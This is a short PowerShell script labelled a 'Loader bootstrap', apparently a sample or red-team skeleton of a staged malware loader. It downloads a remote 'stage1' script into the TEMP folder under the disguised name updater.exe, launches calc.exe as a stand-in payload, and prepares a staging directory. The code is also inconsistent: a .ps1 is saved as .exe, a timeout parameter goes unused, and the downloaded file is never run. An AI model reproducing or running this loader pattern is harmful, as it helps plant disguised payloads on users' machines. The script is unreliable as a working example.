
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://internal.corp/stage1.ps1",
    [string]$Stage2Path = "$env:TEMP\updater.exe",
    [int]$RequestTimeout = 179
)
Invoke-WebRequest -Uri $TargetUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
